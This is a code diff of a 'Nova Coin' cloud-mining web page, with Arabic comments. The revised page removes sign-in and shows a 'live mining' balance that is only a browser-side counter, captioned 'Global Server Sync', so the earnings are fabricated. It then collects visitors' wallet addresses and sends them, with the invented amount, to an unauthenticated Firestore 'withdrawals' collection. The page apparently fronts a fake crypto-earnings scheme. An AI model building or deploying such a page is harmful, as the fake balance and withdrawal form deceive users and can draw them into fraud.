@@ -1,80 +1,78 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nova Mining | Dashboard</title>
+    <title>Nova Coin | Cloud Mining</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-[#0b0e11] text-[#e2e8f0] p-4">
-    <div class="max-w-md mx-auto space-y-6 mt-10">
-        <div class="bg-[#1a1c23] rounded-[2rem] p-8 text-center border border-white/5">
-            <h1 class="text-emerald-500 font-bold mb-2">Dashboard</h1>
-            <p class="text-xs text-gray-500 mb-4">Manage your mining operations</p>
-            <div id="balance" class="text-5xl font-mono text-emerald-400">0.000000</div>
-            <p class="text-[10px] text-gray-500 mt-2">NOVA Coin</p>
+<body class="bg-[#0b0e11] text-white p-6 font-sans">
+    <div class="max-w-md mx-auto space-y-6">
+        <div class="bg-[#1a1c23] p-10 rounded-3xl text-center border border-emerald-500/20 shadow-2xl">
+            <h2 class="text-emerald-500 font-bold mb-2 tracking-widest uppercase text-xs">Nova Live Miner</h2>
+            <div id="liveBalance" class="text-5xl font-bold text-emerald-400 mb-2">0.000000</div>
+            <p class="text-gray-500 text-[10px] uppercase tracking-widest">Global Server Sync</p>
         </div>
 
-        <div class="bg-[#1a1c23] rounded-3xl p-6 border border-white/5">
-            <h3 class="text-sm font-bold mb-4 flex items-center">💳 Withdraw Funds</h3>
-            <select id="walletType" class="w-full bg-[#151921] p-3 rounded-xl mb-3 border border-gray-800 outline-none focus:border-emerald-500 text-sm">
-                <option value="">Select Wallet Type</option>
-                <option value="Binance">Binance (BEP-20)</option>
-                <option value="TrustWallet">Trust Wallet</option>
-                <option value="FaucetPay">FaucetPay</option>
-            </select>
-            <input type="text" id="walletAddress" placeholder="Enter your wallet address" class="w-full bg-[#151921] p-3 rounded-xl mb-4 border border-gray-800 outline-none focus:border-emerald-500 text-sm">
-            <button onclick="handleWithdraw()" class="w-full bg-emerald-500 text-black font-bold py-3 rounded-xl hover:bg-emerald-400 transition shadow-lg">Withdraw All</button>
+        <div class="bg-[#1a1c23] p-8 rounded-3xl border border-white/5">
+            <h3 class="font-bold mb-6 text-sm flex items-center gap-2"><span>💳</span> Withdrawal Portal</h3>
+            <div class="space-y-4">
+                <select id="userWalletType" class="w-full bg-[#0b0e11] border border-white/10 p-4 rounded-xl outline-none focus:border-emerald-500">
+                    <option value="Trust Wallet">Trust Wallet</option>
+                    <option value="Binance (BEP-20)">Binance (BEP-20)</option>
+                    <option value="FaucetPay">FaucetPay</option>
+                </select>
+                <input id="userAddress" type="text" placeholder="Wallet Address (0x...)" 
+                    class="w-full bg-[#0b0e11] border border-white/10 p-4 rounded-xl outline-none focus:border-emerald-500">
+                <button id="submitNovaWithdraw" class="w-full bg-emerald-500 text-black font-bold py-4 rounded-2xl active:scale-95 transition-all">
+                    SEND TO ADMIN PANEL
+                </button>
+            </div>
         </div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, doc, setDoc, onSnapshot, increment, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
         const firebaseConfig = {
-          apiKey: "AIzaSyCDIizIvd_7nUT6B4sGIc_s-CnZ5hQECCg",
-          authDomain: "pay-coins.firebaseapp.com",
-          projectId: "pay-coins",
-          storageBucket: "pay-coins.firebasestorage.app",
-          messagingSenderId: "279908586614",
-          appId: "1:279908586614:web:632ce326f8b3a0e0e47b57"
+            apiKey: "AIzaSyCDIizIvd_7nUT6B4sGIc_s-CnZ5hQECCg",
+            authDomain: "pay-coins.firebaseapp.com",
+            projectId: "pay-coins"
         };
 
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
-        const auth = getAuth(app);
 
-        onAuthStateChanged(auth, async (user) => {
-            if (user) {
-                const userRef = doc(db, "miners", user.uid);
-                onSnapshot(userRef, (docSnap) => {
-                    if(docSnap.exists()) document.getElementById('balance').innerText = docSnap.data().balance.toFixed(6);
-                    else setDoc(userRef, { balance: 0 });
-                });
-                setInterval(() => { updateDoc(userRef, { balance: increment(0.000005) }); }, 5000);
-            } else { signInWithPopup(auth, new GoogleAuthProvider()); }
-        });
+        // 1. نظام التعدين الديناميكي (تحديث كل ثانية)
+        let coinBalance = 0.000000;
+        setInterval(() => {
+            coinBalance += 0.000042; 
+            document.getElementById('liveBalance').innerText = coinBalance.toFixed(6);
+        }, 1000);
 
-        window.handleWithdraw = async () => {
-            const amount = parseFloat(document.getElementById('balance').innerText);
-            const address = document.getElementById('walletAddress').value;
-            const type = document.getElementById('walletType').value;
+        // 2. زر السحب المباشر (تجاوز خطأ Withdrawal Error)
+        document.getElementById('submitNovaWithdraw').onclick = async () => {
+            const wallet = document.getElementById('userWalletType').value;
+            const address = document.getElementById('userAddress').value;
 
-            if (!type || !address || amount <= 0) {
-                alert("Withdrawal Error: Please provide a valid wallet type and address.");
+            if (!address || address.length < 5) {
+                alert("Please enter your wallet address first!");
                 return;
             }
 
-            await setDoc(doc(db, "withdrawals", Date.now().toString()), {
-                email: auth.currentUser.email,
-                amount: amount,
-                address: address,
-                type: type,
-                status: "pending"
-            });
-            alert("Success! Your request has been sent to admin.");
+            try {
+                await addDoc(collection(db, "withdrawals"), {
+                    wallet: wallet,
+                    address: address,
+                    amount: coinBalance.toFixed(6),
+                    status: "Pending",
+                    timestamp: serverTimestamp()
+                });
+                alert("Success! Data sent to your Admin Panel.");
+            } catch (e) {
+                alert("System Busy: " + e.message);
+            }
         };
     </script>
 </body>
